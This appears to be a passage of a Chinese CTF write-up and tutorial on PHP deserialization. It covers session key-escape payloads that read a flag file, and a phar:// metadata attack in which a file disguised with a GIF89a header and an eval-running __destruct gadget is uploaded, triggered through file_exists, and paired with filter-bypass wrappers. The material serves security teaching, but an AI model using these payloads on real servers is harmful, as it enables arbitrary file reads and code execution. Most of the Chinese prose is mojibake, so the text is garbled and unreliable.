href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; æ ¹æ®æç¤ºï¼š?f=phpinfo å‘ç° auto_append_file åœ¨ä»»ä½•é¡µé¢è¾“å‡ºå‰é¦–å…ˆåŒ…å« d0g3_f1ag.phpæ–‡ä»¶ï¼ŒçŒœæµ‹ flagå­˜åœ¨äº è¯¥æ–‡ä»¶å½“ä¸­ã€‚é‚£æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•è¯»å–åˆ°è¯¥æ–‡ä»¶ï¼› å½“ $function == &#39;show_image&#39; æ—¶ï¼Œé¦–å…ˆå¯¹ $serialize_info è¿›è¡Œååºåˆ—åŒ–ï¼Œç„¶åå¯¹å…¶ä¸­ $userinfo[&#39;img&#39;] è¿›è¡Œbase64è§£ç ä¹‹åï¼Œä½¿ç”¨ file_get_contents è¯»å–å‡ºæ–‡ä»¶ï¼›è€Œ $serialize_info æ­£æ˜¯æˆ‘ä»¬æ‰€ä¼ å…¥çš„ $function åœ¨ è¿›è¡Œ filter() å‡½æ•°è¿‡æ»¤ä¹‹åçš„ç»“æœï¼› æ‰‹åŠ¨æ·»åŠ ä»¥ä¸‹ä»£ç ï¼Œè¾“å‡ºæŸ¥çœ‹åºåˆ—åŒ–ä¹‹åçš„å†…å®¹ï¼š è¯¥ base64 ç¼–ç  Z3Vlc3RfaW1nLnBuZw== å³æ˜¯ guest_img.png æˆ‘ä»¬éœ€è¦ä½¿ é”® img ä¸º d0g3_f1ag.php æ–‡ä»¶åŠ å¯†ä¹‹åçš„å†…å®¹ï¼›ZDBnM19mMWFnLnBocA== æ˜¯ d0g3_f1ag.php æ„é€  123456post ä¼ å‚ï¼š _SESSION[user]=a&amp;_SESSION[function]=p&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;# åºåˆ—åŒ–å string(128) &quot;a:3:&#123;s:4:&quot;user&quot;;s:1:&quot;a&quot;;s:8:&quot;function&quot;;s:42:&quot;p&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot; ä»¥ä¸Šå†…å®¹å¦‚æœè¿›è¡Œååºåˆ—åŒ–ï¼Œå°†ä¼šæŠ¥é”™ï¼ŒåŸå› ï¼š å‰é¢ a:3: è¡¨ç¤º SESSION å«æœ‰ä¸‰ä¸ªé”®å€¼å¯¹ï¼Œå®ƒä¼šä¸€ç›´å‘åå–ç›´åˆ°å–åˆ°ä¸‰ä¸ªä¸ºæ­¢ï¼›ç¬¬ä¸€ä¸ª user æ­£å¸¸å–å€¼ï¼›ç¬¬äºŒä¸ª function ç”±äºé•¿åº¦æ˜¯ 42 ï¼Œå°†ä¼šå–åˆ°çš„å€¼æ˜¯ p&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; ï¼›æ‰€ä»¥ä»æ—§ä¼šå–åˆ°ç¬¬ä¸‰ä¸ª img å€¼ä¸º Z3Vlc3RfaW1nLnBuZw== ï¼›ä½†æ˜¯è¿›è¡Œååºåˆ—åŒ–ä¹‹åï¼Œæˆ‘ä»¬å¸Œæœ›å¾—åˆ°çš„æ˜¯ç¬¬ä¸‰ä¸ª img è¢«æŒ¤æ‰ï¼Œä»¥æˆ‘ä»¬åœ¨ function ä¸­ä¼ é€’çš„ img ä½œä¸ºæ–°çš„ img ï¼›æ‰€ä»¥å®é™…ä¸Šå¦‚æœ s:42:&quot;p&quot; æ˜¯ s:1:&quot;p&quot; å°±å¥½äº†ã€‚ åˆ©ç”¨è¿‡æ»¤å‡½æ•°ä½¿å­—ç¬¦å‡å°‘æ¥å¢å¤§é•¿åº¦ï¼Œåæ‰åé¢éƒ¨åˆ†å†…å®¹ã€‚ æµ‹è¯•ï¼š 123_SESSION[user]=flag&amp;_SESSION[function]=b&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;# è¿”å› string(127) &quot;a:3:&#123;s:4:&quot;user&quot;;s:4:&quot;&quot;;s:8:&quot;function&quot;;s:42:&quot;b&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot; &quot;;s:8:&quot;function&quot;;s:42:&quot;b é•¿åº¦æ˜¯ 24ï¼Œæ„é€  user å€¼æ˜¯ 6ä¸ª flag ï¼Œå³é•¿åº¦æ˜¯ 24ï¼Œå°†ä¼šæŠŠ &quot;;s:8:&quot;function&quot;;s:42:&quot;båæ‰ï¼Œå½“ä½œ user çš„å€¼ï¼›è€Œ img å³ä¸ºæˆ‘ä»¬çš„ d0g3_f1ag.phpï¼›å†æ‰‹åŠ¨è¡¥å……ä¸€ä¸ªé”®å€¼å¯¹ï¼ˆéšæ„ï¼‰æ»¡è¶³ _SESSION çš„ä¸‰ä¸ªé”®ï¼›è€Œä½äºæœ€åçš„é»˜è®¤çš„ guest_img.png å°†è¢«æŒ¤æ‰ï¼Œä¸ä¼šèµ·ä½œç”¨ï¼› æ³¨æ„ï¼šç”±äºåæ‰äº†ä¸€ä¸ªé”®å€¼å¯¹ï¼Œæˆ‘ä»¬æŠŠ img ä½œä¸ºç¬¬äºŒä¸ªé”®åå­˜åœ¨äº†ï¼Œä½† SESSION æœ¬èº«æ˜¯æœ‰ä¸‰ä¸ªé”®å€¼å¯¹çš„ï¼Œå¦‚æœæˆ‘ä»¬ä¸æ‰‹åŠ¨æ·»åŠ ä¸€ä¸ªé”®å€¼å¯¹çš„è¯ï¼Œæœ€åå­˜åœ¨çš„åŸæœ¬çš„ img ä¹Ÿå°†ä¼šè¢«è§£æï¼Œèµ·ä¸åˆ°æŒ¤æ‰çš„ä½œç”¨ã€‚ payload1 â€” é”®å€¼é€ƒé€¸ï¼š 123_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=b&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;c&quot;;s:3:&quot;111&quot;;&#125;# åºåˆ—åŒ–å string(146) &quot;a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:60:&quot;b&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;c&quot;;s:3:&quot;111&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot; å¯¹ /d0g3_fllllllag è¿›è¡Œ base64ç¼–ç ä¸º L2QwZzNfZmxsbGxsbGFnï¼Œé•¿åº¦æ˜¯ 20ï¼› æ„é€ ä»¥ä¸‹å†…å®¹ï¼š 1_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=b&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;c&quot;;s:3:&quot;111&quot;;&#125; &quot;;s:49: é•¿åº¦æ˜¯ 7ï¼Œæ„é€  é”®åä¸º flagphpï¼Œå°†å…¶åæ‰ä½œä¸ºä¸€ä¸ªæ–°çš„é”®åï¼Œå€¼æ˜¯ dbï¼›ç¬¬äºŒä¸ªé”®å img å³æ˜¯æˆ‘ä»¬æ‰€æ„é€ çš„ï¼›ç”±äº a:2:ï¼Œå› æ­¤ä¸€å…±åªä¼šå–ä¸¤ä¸ªé”®åï¼Œæ‰€ä»¥æœ€åçš„ img è¢«æŒ¤æ‰äº†ã€‚ payload2 â€” é”®åé€ƒé€¸ï¼š 123_SESSION[flagphp]=;s:2:&quot;db&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;# åºåˆ—åŒ–å string(108) &quot;a:2:&#123;s:7:&quot;&quot;;s:49:&quot;;s:2:&quot;db&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot; å‡½æ•°æ€»ç»“ï¼š 12345678910111213141516171819202122implode() æŠŠæ•°ç»„å…ƒç´ ç»„åˆä¸ºä¸€ä¸ªå­—ç¬¦ä¸²åè¿”å›ï¼š&lt;?php$arr = array(&#x27;Hello&#x27;,&#x27;World!&#x27;,&#x27;Beautiful&#x27;,&#x27;Day!&#x27;);echo implode(&quot; &quot;,$arr);?&gt; # è¿”å› Hello World! Beautiful Day! unset() é”€æ¯æŒ‡å®šçš„å˜é‡ extract() å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨&lt;?php$a = &quot;Original&quot;;$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);extract($my_array);echo &quot;\\$a = $a; \\$b = $b; \\$c = $c&quot;;?&gt; # è¿”å› $a = Cat; $b = Dog; $c = Horse è¯¥å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ã€‚é’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ã€‚ç¬¬äºŒä¸ªå‚æ•° type ç”¨äºæŒ‡å®šå½“æŸä¸ªå˜é‡å·²ç»å­˜åœ¨ï¼Œè€Œæ•°ç»„ä¸­åˆæœ‰åŒåå…ƒç´ æ—¶ï¼Œextract() å‡½æ•°å¦‚ä½•å¯¹å¾…è¿™æ ·çš„å†²çªã€‚è¯¥å‡½æ•°è¿”å›æˆåŠŸå¯¼å…¥åˆ°ç¬¦å·è¡¨ä¸­çš„å˜é‡æ•°ç›®ã€‚ ä¸‰ã€phar åºåˆ—åŒ–https://www.cnblogs.com/zzjdbk/p/13030571.html https://blog.csdn.net/qq975353472/article/details/109668373 https://xz.aliyun.com/t/2715 ä¸€èˆ¬åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ï¼Œä¸€èˆ¬éƒ½æ˜¯å€ŸåŠ©unserialize()å‡½æ•°ã€‚ æ–°å‹æ”»å‡»æ–¹å¼ï¼šåˆ©ç”¨Phar:// ä¼ªåè®®è¯»å–pharæ–‡ä»¶æ—¶ï¼Œä¼šååºåˆ—åŒ–meta-dataå‚¨å­˜çš„ä¿¡æ¯ã€‚ ç‰¹ç‚¹ï¼šä¸ä½¿ç”¨ unserialize()å‡½æ•° åˆ©ç”¨æ¡ä»¶ï¼š èƒ½å¤Ÿä¸Šä¼  .phar æ–‡ä»¶è‡³æœåŠ¡å™¨ å­˜åœ¨å¯ç”¨çš„ é­”æœ¯æ–¹æ³• ä½œä¸ºè·³æ¿ æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ / : phar ç­‰ç‰¹æ®Šå­—ç¬¦æœªè¢«è¿‡æ»¤ å—å½±å“å‡½æ•°åˆ—è¡¨ï¼š åŸç†å‚è€ƒ https://blog.zsxsoft.com/post/38 3.1 phar ä»‹ç»PHAR (â€œPhp ARchiveâ€) æ˜¯PHPé‡Œç±»ä¼¼äºJARçš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶ï¼Œä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„ meta-data ï¼Œå½“å—å½±å“çš„æ–‡ä»¶æ“ä½œå‡½æ•°è°ƒç”¨ phar æ–‡ä»¶æ—¶ï¼Œä¼šè‡ªåŠ¨ååºåˆ—åŒ– meta-data ä¸­çš„å†…å®¹ã€‚ åœ¨PHP 5.3 æˆ–æ›´é«˜ç‰ˆæœ¬ä¸­é»˜è®¤å¼€å¯ï¼Œè¿™ä¸ªç‰¹æ€§ä½¿å¾— PHPä¹Ÿå¯ä»¥åƒ Java ä¸€æ ·æ–¹ä¾¿åœ°å®ç°åº”ç”¨ç¨‹åºæ‰“åŒ…å’Œç»„ä»¶åŒ–ã€‚ä¸€ä¸ªåº”ç”¨ç¨‹åºå¯ä»¥æ‰“æˆä¸€ä¸ª Phar åŒ…ï¼Œç›´æ¥æ”¾åˆ° PHP-FPM ä¸­è¿è¡Œã€‚ç”¨æ¥å°†å¤šä¸ªPHPæ–‡ä»¶æ‰“åŒ…ä¸ºä¸€ä¸ªæ–‡ä»¶.å¯ä»¥å’Œtar zipç›¸äº’è½¬åŒ–ã€‚ ç‰ˆæœ¬ &gt;5.2 phpé€šè¿‡ç”¨æˆ·å®šä¹‰å’Œå†…ç½®çš„â€œæµåŒ…è£…å™¨â€å®ç°å¤æ‚çš„æ–‡ä»¶å¤„ç†åŠŸèƒ½ã€‚å†…ç½®åŒ…è£…å™¨å¯ç”¨äºæ–‡ä»¶ç³»ç»Ÿå‡½æ•°ï¼Œå¦‚(fopen(),copy(),file_exists()å’Œfilesize()ã€‚ phar://å°±æ˜¯ä¸€ç§å†…ç½®çš„æµåŒ…è£…å™¨ã€‚ phpä¸­ä¸€äº›å¸¸è§çš„æµåŒ…è£…å™¨å¦‚ä¸‹ï¼š 123456789101112file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨ç”¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°æ—¶é»˜è®¤å°±ä½¿ç”¨è¯¥åŒ…è£…å™¨http:// â€” è®¿é—® HTTP(s) ç½‘å€ftp:// â€” è®¿é—® FTP(s) URLsphp:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰zlib:// â€” å‹ç¼©æµdata:// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼phar:// â€” PHP å½’æ¡£ssh2:// â€” Secure Shell 2rar:// â€” RARogg:// â€” éŸ³é¢‘æµexpect:// â€” å¤„ç†äº¤äº’å¼çš„æµ 3.2 phar æ–‡ä»¶ç»“æ„ a stub phar æ–‡ä»¶çš„æ ‡å¿—ï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œå¿…é¡»ä»¥ __HALT_COMPILER();?&gt; ç»“å°¾ï¼Œå¦åˆ™ phar æ‰©å±•å°†æ— æ³•è¯†åˆ«è¯¥æ–‡ä»¶æ˜¯ pharæ–‡ä»¶ 1xxx&lt;?php xxx;__HALT_COMPILER();?&gt; a manifest describing the contents Pharæ–‡ä»¶ä¸­è¢«å‹ç¼©çš„æ–‡ä»¶çš„ä¸€äº›ä¿¡æ¯ï¼Œå…¶ä¸­Meta-dataéƒ¨åˆ†çš„ä¿¡æ¯ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å‚¨å­˜ï¼Œè¿™é‡Œå°±æ˜¯æ¼æ´åˆ©ç”¨çš„å…³é”®ç‚¹ã€‚ the file contents æ‰€è¢«å‹ç¼©çš„æ–‡ä»¶å†…å®¹ï¼Œåœ¨æ— ç‰¹æ®Šè¦æ±‚çš„æƒ…å†µä¸‹ï¼Œè¯¥å†…å®¹å¯éšæ„å†™ a signature for verifying Phar integrity ç­¾åæ ¼å¼ï¼Œä½äºæœ«å°¾ 3.3 æµ‹è¯•ï¼šphar æ–‡ä»¶çš„æ„é€  æ¡ä»¶ï¼šphp.ini ç¼–å†™ ç”Ÿæˆ .phar æ–‡ä»¶ 1234567891011121314&lt;?php class Test&#123; &#125; $phar = new Phar(&quot;1.phar&quot;); //åç¼€å¿…é¡»ä¸º .phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); // è®¾ç½® stub $o = new Test(); $o-&gt;data = &#x27;hacker123!&#x27;; $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„ meta-data å­˜å…¥ manifest $phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åå°†è‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering();?&gt; è®¿é—®è¿‡åï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆ 1.phar æ–‡ä»¶ï¼Œæ‰“å¼€ï¼Œçœ‹å…¶å†…å®¹ å‘ç°ï¼Œmeta-data æ˜¯ä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨çš„ é‚£ä¹ˆï¼Œåœ¨å“ªé‡Œè¿›è¡Œååºåˆ—åŒ–ï¼Ÿ phar://åè®®è¯»å–æ–‡ä»¶ php å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡ phar:// ä¼ªåè®®è§£æ phar æ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°† meta-data è¿›è¡Œååºåˆ—åŒ–ï¼Œç»æµ‹è¯•åï¼Œæ‰€å—å½±å“çš„å‡½æ•°æœ‰ 1234567&lt;?phpclass Test&#123; function __destruct()&#123; echo $this-&gt;data; &#125;&#125;include(&#x27;phar://1.phar&#x27;);//phar:// è§¦å‘ï¼šè¿›è¡Œååºåˆ—åŒ– è®¿é—®ï¼ŒæˆåŠŸè§¦å‘äº†ååºåˆ—åŒ–ï¼Œå¾—åˆ° 3.4 å¸¸è§åˆ©ç”¨ï¼šæ–‡ä»¶ä¸Šä¼ +æ–‡ä»¶åŒ…å«ç¯å¢ƒï¼š 123upload_file.php # åç«¯æ£€æµ‹æ–‡ä»¶ä¸Šä¼ ,ç¡®ä¿æ–‡ä»¶ç±»å‹åŠåç¼€æ˜¯ .gifupload_file.html #æ–‡ä»¶ä¸Šä¼ è¡¨å•å‰ç«¯file_un.php #å­˜åœ¨ file_exists() ä»¥åŠ __destruct() ç”¨ä»¥phar://ä¼ªåè®®è¯»å–æ–‡ä»¶å†…å®¹ åˆ©ç”¨æ¡ä»¶ï¼š å­˜åœ¨æ–‡ä»¶ä¸Šä¼  å­˜åœ¨ file_exists() fopen() file_get_contents() file() ç­‰æ–‡ä»¶æ“ä½œå‡½æ•° phar:// ç­‰å­—ç¬¦æœªè¢«è¿‡æ»¤ upload_file.php 123456789101112131415161718192021&lt;?phpif (($_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;)&amp;&amp;(substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#x27;.&#x27;)+1))== &#x27;gif&#x27;) &#123; echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]; echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;]; echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; if (file_exists(&quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;])) &#123; echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;; &#125; else &#123; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload_file/&quot; .$_FILES[&quot;file&quot;][&quot;name&quot;]); echo &quot;Stored in: &quot; . &quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]; &#125; &#125;else &#123; echo &quot;Invalid file,you can only upload gif&quot;; &#125; upload_file.html 123456&lt;body&gt;&lt;form action=&quot;http://localhost:8080/ctf/phar/upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;Upload&quot; /&gt;&lt;/form&gt;&lt;/body&gt; file_un.php 1234567891011&lt;?phphighlihgt_file(__FILE__);$filename=$_GET[&#x27;filename&#x27;];class AnyClass&#123; var $output = &#x27;echo &quot;ok&quot;;&#x27;; function __destruct() &#123; eval($this -&gt; output); &#125;&#125;file_exists($filename); é¢˜ç›®ï¼š ç”Ÿæˆ .phar æ–‡ä»¶ï¼šphar.php 12345678910111213141516171819202122&lt;?php//highlihgt_file(__FILE__);$filename=$_GET[&#x27;filename&#x27;];class AnyClass&#123; var $output = &#x27;echo &quot;ok&quot;;&#x27;; function __destruct() &#123; eval($this -&gt; output); &#125;&#125;file_exists($filename); $phar = new Phar(&quot;hack.phar&quot;); //åç¼€å¿…é¡»ä¸º .phar $phar-&gt;stopBuffering(); $phar-&gt;setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;); // è®¾ç½® stub $phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ $o = new AnyClass(); $o-&gt;output = &#x27;phpinfo();&#x27;; $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest //ç­¾å2å°†è‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering(); è®¿é—®ï¼Œå¾—åˆ° hack.phar å°† hack.phar åç¼€ä¿®æ”¹ä¸º hack.gif åœ¨ upload_file.html é‡Œä¸Šä¼  ç„¶åæˆ‘ä»¬è¿›å…¥ file_un.php 1?filename=phar://hack.gif å¯ä»¥çœ‹åˆ°ï¼Œå‘½ä»¤æˆåŠŸæ‰§è¡Œ 3.5 ç»•è¿‡å§¿åŠ¿ï¼šè¿‡æ»¤ phar å½“é¢˜ç›®ç¯å¢ƒé™åˆ¶ phar ä¸èƒ½å‡ºç°åœ¨å‰é¢çš„å­—ç¬¦é‡Œï¼Œå³æ— æ³•ä½¿ç”¨ phar:// åè®® ï¼Œå¯ä»¥ä½¿ç”¨ compress.bzip2://å’Œcompress.zlib://ç­‰ç»•è¿‡ 1234compress.bzip://phar:///test.phar/test.txtcompress.bzip2://phar:///test.phar/test.txtcompress.zlib://phar:///home/sx/test.phar/test.txtphp://filter/resource=phar:///test.phar/test.txt å½“ç¯å¢ƒé™åˆ¶äº†pharä¸èƒ½å‡ºç°åœ¨å‰é¢çš„å­—ç¬¦é‡Œï¼Œè¿˜å¯ä»¥é…åˆå…¶ä»–åè®®è¿›è¡Œåˆ©ç”¨ã€‚ 1php://filter/read=convert.base64-encode/resource=phar://phar.phar GIFæ ¼å¼éªŒè¯å¯ä»¥é€šè¿‡åœ¨æ–‡ä»¶å¤´éƒ¨æ·»åŠ GIF89aç»•è¿‡ 1231ã€$phar-&gt;setStub(â€œGIF89aâ€.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub2ã€ç”Ÿæˆä¸€ä¸ªphar.pharï¼Œä¿®æ”¹åç¼€åä¸ºphar.gif 3.6 php-session ååºåˆ—åŒ–https://www.cnblogs.com/NPFS/p/13795170.html https://www.freebuf.com/news/202819.html https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&amp;utm_medium=referral https://github.com/80vul/phpcodz/blob/master/research/pch-013.md 3.6.1 å…³äº php ä¸­çš„ session å­˜å‚¨æœºåˆ¶session ä»‹ç»ï¼š åœ¨è®¡ç®—æœºä¸­ï¼Œå°¤å…¶æ˜¯åœ¨ç½‘ç»œåº”ç”¨ä¸­ï¼Œç§°ä¸ºâ€œä¼šè¯æ§åˆ¶â€ã€‚Session å¯¹è±¡å­˜å‚¨ç‰¹å®šç”¨æˆ·ä¼šè¯æ‰€éœ€çš„å±æ€§åŠé…ç½®ä¿¡æ¯ã€‚è¿™æ ·ï¼Œå½“ç”¨æˆ·åœ¨åº”ç”¨ç¨‹åºçš„ Web é¡µä¹‹é—´è·³è½¬æ—¶ï¼Œå­˜å‚¨åœ¨ Session å¯¹è±¡ä¸­çš„å˜é‡å°†ä¸ä¼šä¸¢å¤±ï¼Œè€Œæ˜¯åœ¨æ•´ä¸ªç”¨æˆ·ä¼šè¯ä¸­ä¸€ç›´å­˜åœ¨ä¸‹å»ã€‚å½“ç”¨æˆ·è¯·æ±‚æ¥è‡ªåº”ç”¨ç¨‹åºçš„ Web é¡µæ—¶ï¼Œå¦‚æœè¯¥ç”¨æˆ·è¿˜æ²¡æœ‰ä¼šè¯ï¼Œåˆ™ Web æœåŠ¡å™¨å°†è‡ªåŠ¨åˆ›å»ºä¸€ä¸ª Session å¯¹è±¡ã€‚å½“ä¼šè¯è¿‡æœŸæˆ–è¢«æ”¾å¼ƒåï¼ŒæœåŠ¡å™¨å°†ç»ˆæ­¢è¯¥ä¼šè¯ã€‚ å½“ç¬¬ä¸€æ¬¡è®¿é—®ç½‘ç«™æ—¶ï¼ŒSeesion_start()å‡½æ•°å°±ä¼šåˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„Session IDï¼Œå¹¶è‡ªåŠ¨é€šè¿‡HTTPçš„å“åº”å¤´ï¼Œå°†è¿™ä¸ªSession IDä¿å­˜åˆ°å®¢æˆ·ç«¯Cookieä¸­ã€‚åŒæ—¶ï¼Œä¹Ÿåœ¨æœåŠ¡å™¨ç«¯åˆ›å»ºä¸€ä¸ªä»¥Session IDå‘½åçš„æ–‡ä»¶ï¼Œç”¨äºä¿å­˜è¿™ä¸ªç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯ã€‚å½“åŒä¸€ä¸ªç”¨æˆ·å†æ¬¡è®¿é—®è¿™ä¸ªç½‘ç«™æ—¶ï¼Œä¹Ÿä¼šè‡ªåŠ¨é€šè¿‡HTTPçš„è¯·æ±‚å¤´å°†Cookieä¸­ä¿å­˜çš„Seesion IDå†æºå¸¦è¿‡æ¥ï¼Œè¿™æ—¶Session_start()å‡½æ•°å°±ä¸ä¼šå†å»åˆ†é…ä¸€ä¸ªæ–°çš„Session IDï¼Œè€Œæ˜¯åœ¨æœåŠ¡å™¨çš„ç¡¬ç›˜ä¸­å»å¯»æ‰¾å’Œè¿™ä¸ªSession IDåŒåçš„Sessionæ–‡ä»¶ï¼Œå°†è¿™ä¹‹å‰ä¸ºè¿™ä¸ªç”¨æˆ·ä¿å­˜çš„ä¼šè¯ä¿¡æ¯è¯»å‡ºï¼Œåœ¨å½“å‰è„šæœ¬ä¸­åº”ç”¨ï¼Œè¾¾åˆ°è·Ÿè¸ªè¿™ä¸ªç”¨æˆ·çš„ç›®çš„ã€‚ php ä¸­çš„ session å­˜å‚¨ç›¸å…³åŒ¹é…å€¼ï¼š PHP ç‰ˆæœ¬ &gt;= 5.4 ä¸­æœ‰å…³ session çš„ç›¸å…³é…ç½®ï¼šphp.ini 1234567891011121314151. session.upload_progress.enabled = on# enabled = on è¡¨ç¤º upload_progress åŠŸèƒ½å¼€å¯ï¼Œå³å½“æµè§ˆå™¨å‘æœåŠ¡å™¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œphp ä¼šæŠŠæ­¤æ¬¡æ–‡ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯ï¼Œå¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰éƒ½å‚¨å­˜åœ¨ sessionä¸­2. session.upload_progress.cleanup = on# cleanup = on å½“æ–‡ä»¶ä¸Šä¼ ç»“æŸä¹‹åï¼Œ oho ä¼šç«‹å³å°†å¯¹åº”çš„ session æ–‡ä»¶æ¸…ç©º3. session.upload_progress.prefix = &quot;upload_progress_&quot;4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;# nameå½“å®ƒå‡ºç°åœ¨è¡¨å•ä¸­ï¼Œphpå°†ä¼šæŠ¥å‘Šä¸Šä¼ è¿›åº¦ï¼Œæœ€å¤§çš„å¥½å¤„æ˜¯ï¼Œå®ƒçš„å€¼å¯æ§ï¼›# é‡ç‚¹ï¼šprefix+nameå°†è¡¨ç¤ºä¸ºsessionä¸­çš„é”®å5. session.upload_progress.freq = &quot;1%&quot;6. session.upload_progress.min_freq = &quot;1&quot;7. session.use_strict_mode=off # è¡¨ç¤ºæˆ‘ä»¬å¯¹ Cookie ä¸­çš„ session æ˜¯å¯æ§çš„ 12345678910111. session.save_path=&quot;&quot; # è®¾ç½® session çš„å‚¨å­˜è·¯å¾„2. session.save_handler=&quot;&quot;# è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®ä¼šè¯å­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨æœ¬å‡½æ•°(æ•°æ®åº“ç­‰æ–¹å¼)3. session.auto_start# boolen 